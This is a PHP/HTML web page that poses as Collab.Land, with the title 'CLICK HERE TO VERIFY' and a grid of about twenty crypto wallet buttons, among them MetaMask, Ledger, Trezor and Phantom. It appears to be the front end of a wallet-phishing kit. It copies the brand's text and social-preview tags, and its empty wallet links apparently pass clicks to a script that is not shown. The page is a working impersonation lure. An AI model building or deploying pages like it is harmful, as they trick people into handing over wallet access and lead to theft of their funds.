<?php

$pageURL = 'http';

if ($_SERVER["HTTPS"] == "on") {
  $pageURL .= "s";
}
$pageURL .= "://";
$pageURL .= $_SERVER["SERVER_NAME"];

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <meta name="title" content="CLICK HERE TO VERIFY">
  <meta name="description" content="Collab.Land is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community." />


  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="<?php echo $pageURL; ?>">
  <meta property="og:title" content="CLICK HERE TO VERIFY">
  <meta property="og:description" content="Collab.Land is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community.">
  <meta property="og:image" content="<?php echo $pageURL; ?>/assets/images/banner.jpg">

  <!-- Twitter -->
  <meta property="twitter:card" content="collab.land">
  <meta property="twitter:url" content="<?php echo $pageURL; ?>/">
  <meta property="twitter:title" content="CLICK HERE TO VERIFY">
  <meta property="twitter:description" content="Collab.Land is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community.">
  <meta property="twitter:image" content="<?php echo $pageURL; ?>/assets/images/banner.jpg">

  <title>CLICK HERE TO VERIFY</title>

  <link rel="icon" href="favicon.ico" />

  <link rel="stylesheet" href="assets/vendor/bootstrap.css">
  <link rel="stylesheet" href="assets/css/style.css?v=<?php echo time(); ?>" />
</head>

<body>
  <nav class="navbar navbar-expand-md navbar-dark p-3 mb-4 mi-dark w-100">
    <a class="nav-link" href="/"> <img src="./assets/images/logo.png" alt="" width="220px" height="40px"></a>
  </nav>

  <div class="d-grid align-items-center px-3">
    <div class="row row-cols-2">

      <div class="crypto-button col" id="Metamask">
        <img src="assets/images/metamask.png" alt="" />
        <a href="">MetaMask</a>
      </div>

      <div class="crypto-button col" id="Coinbase">
        <img src="assets/images/coinbase_wallet.svg" alt="" />
        <a href="">Coinbase</a>
      </div>

      <div class="crypto-button col" id="WalletConnect">
        <img src="assets/images/walletconnect.svg" alt="" />
        <a href="">WalletConnect</a>
      </div>

      <div class="crypto-button col" id="WalletConnect">
        <img src="assets/images/talisman.svg" alt="" />
        <a href="">Talisman</a>
      </div>

      <div class="visibility-btn justify-content-center col">Show more 👇</div>

      <div class="crypto-button col" id="Ledger">
        <img src="assets/images/ledger.png" alt="" />
        <a href="">Ledger</a>
      </div>

      <div class="crypto-button col" id="Trust Wallet">
        <img src="assets/images/trustwallet.png" alt="" />
        <a href="">Trust Wallet</a>
      </div>
      <div class="crypto-button col" id="Token pocket">
        <img src="assets/images/tokenpocket.png" alt="" />
        <a href="">Token pocket</a>
      </div>
      <div class="crypto-button col" id="Trezor">
        <img src="assets/images/trezor.png" alt="" />
        <a href="">Trezor</a>
      </div>
      <div class="crypto-button col" id="Nifty Gateway">
        <img src="assets/images/nifty.png" alt="" />
        <a href="">Nifty Gateway</a>
      </div>
      <div class="crypto-button col" id="Flow">
        <img src="assets/images/flow.png" alt="" />
        <a href="">Flow</a>
      </div>
      <div class="crypto-button col" id="Eluvio">
        <img src="assets/images/eluvio.png" alt="" />
        <a href="">Eluvio</a>
      </div>
      <div class="crypto-button col" id="Dapper">
        <img src="assets/images/dapper.png" alt="" />
        <a href="">Dapper</a>
      </div>
      <div class="crypto-button col" id="Venly">
        <img src="assets/images/venly.png" alt="" />
        <a href="">Venly</a>
      </div>
      <div class="crypto-button col" id="Phantom">
        <img src="assets/images/phantom.png" alt="" />
        <a href="">Phantom</a>
      </div>
      <div class="crypto-button col" id="Bitski">
        <img src="assets/images/bitski.png" alt="" />
        <a href="">Bitski</a>
      </div>
      <div class="crypto-button col" id="MEWconnect">
        <img src="assets/images/mewconnect.svg" alt="" />
        <a href="">MEWconnect</a>
      </div>
      <div class="crypto-button col" id="Roll">
        <img src="assets/images/roll.png" alt="" />
        <a href="">Roll</a>
      </div>
      <div class="crypto-button col" id="Tezos (Temple Wallet)">
        <img src="assets/images/tezos.png" alt="" />
        <a href="">Tezos(Temple Wallet)</a>
      </div>
      <div class="crypto-button col" id="Formatic">
        <img src="assets/images/formatic.png" alt="" />
        <a href="">Formatic</a>
      </div>
      <div class="crypto-button col" id="Opolis (Magic.Link)">
        <img src="assets/images/magic_link.svg" alt="" />
        <a href="">Opolis (Magic.Link)</a>
      </div>
      <div class="crypto-button col" id="OtherWallets">
        <img src="assets/images/otherwallet.png" alt="" />
        <a href="">Other wallets</a>
      </div>
    </div>
  </div>

  <script src="assets/vendor/bootstrap.js"></script>
  <script src="assets/vendor/jquery.js"></script>
  <script src="assets/js/script.js?v=<?php echo time(); ?>"></script>
</body>

</html>